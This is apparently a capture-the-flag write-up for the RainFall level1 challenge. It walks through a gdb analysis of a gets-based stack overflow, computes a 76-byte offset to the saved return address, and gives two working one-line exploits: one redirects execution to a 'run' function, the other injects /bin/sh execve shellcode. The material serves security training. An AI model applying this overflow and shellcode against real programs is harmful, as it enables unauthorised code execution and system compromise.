```console
level1@RainFall:~$ gdb level1
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
   0x08048483 <+3>:	and    esp,0xfffffff0
   0x08048486 <+6>:	sub    esp,0x50
   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.
(gdb) b *0x08048490
Breakpoint 1 at 0x8048490
(gdb) r
Starting program: /home/user/level1/level1 

Breakpoint 1, 0x08048490 in main ()
(gdb) info frame
Stack level 0, frame at 0xbffff740:
 eip = 0x8048490 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff738, args: 
 Locals at 0xbffff738, Previous frame's sp is 0xbffff740
 Saved registers:
  ebp at 0xbffff738, eip at 0xbffff73c
(gdb) x/w $eax
0xbffff6f0:	134513824
(gdb) p/d 0xbffff73c - 0xbffff6f0
$1 = 76
(gdb)
```

### Goal 

`eax` of `gets` will write at 0xbffff6f0. The `eip` is at 0xbffff73c. So we want to overwrite `eip` and write adsress of `run` in, by overflowing `eax`.


```bash
(gdb) info functions
```

```console
0x08048444  run
0x08048480  main
```

return address of `run` is `0x08048444` which is `0x44\x84\x04\x08` in little endian.

### Exploit

```bash
(python -c "print 'A' * 76 + '\x44\x84\x04\x08'"; cat)  | ./level1
```

# Or shellcode

```bash
(python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80" + "A" * (76-23) + "\xf0\xf6\xff\xbf"'; cat) | /home/user/level1/level1
```